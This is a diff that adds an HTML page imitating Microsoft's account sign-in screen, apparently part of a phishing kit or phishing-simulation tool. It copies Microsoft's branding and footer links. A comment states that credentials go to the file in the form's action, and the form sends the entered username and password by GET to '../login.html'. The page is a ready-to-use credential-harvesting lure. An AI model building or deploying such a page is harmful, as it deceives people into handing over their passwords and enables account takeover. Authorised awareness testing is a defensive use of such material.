@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in to your Microsoft Account</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in with your Microsoft Account" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="microsoft.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="microsoft-wrap">
+
+      <!-- form center container -->
+      <main class="microsoft-container">
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="microsoft-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Microsoft" />
+
+          <!-- form logo -->
+          <div class="microsoft-logo">
+            <img src="microsoft-logo.svg" alt="Microsoft" />
+          </div>
+
+          <!-- username selected heading -->
+          <div class="microsoft-welcome fade-in">
+            <button type="button"><img src="arrow.png" alt="Back" /></button>
+            <span>...</span>
+          </div>
+
+          <!-- username slide -->
+          <div class="microsoft-username microsoft-slide slide-right">
+            <h2>Sign in</h2>
+            <div class="microsoft-input">
+              <input type="text" name="_username" placeholder="Email, phone, or Skype" value="" />
+            </div>
+            <div class="microsoft-signup">
+              <span>No account?</span>
+              <a href="https://signup.live.com/signup">Create one!</a>
+            </div>
+            <div class="microsoft-options">
+              <a href="#">Sign-in options</a>
+            </div>
+            <div class="microsoft-action">
+              <button type="submit">Next</button>
+            </div>
+          </div>
+
+          <!-- hidden password input -->
+          <div class="microsoft-password microsoft-slide slide-left hidden">
+            <h2>Enter password</h2>
+            <div class="microsoft-input">
+              <input type="password" name="_password" placeholder="Password" value="" />
+            </div>
+            <div class="microsoft-remember">
+              <input type="checkbox" name="_remember" checked />
+              <span>Keep me signed in</span>
+            </div>
+            <div class="microsoft-forgot">
+              <a href="#">Forgot my password</a>
+            </div>
+            <div class="microsoft-action">
+              <button type="submit">Sign in</button>
+            </div>
+          </div>
+
+        </form>
+
+      </main>
+
+    </section>
+
+    <!-- form footer links -->
+    <footer class="microsoft-footer">
+      <div>
+        <span>©2019 Microsoft</span>
+        <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse">Terms of use</a>
+        <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement">Privacy &amp; cookies</a>
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="microsoft.js"></script>
+
+  </body>
+</html>
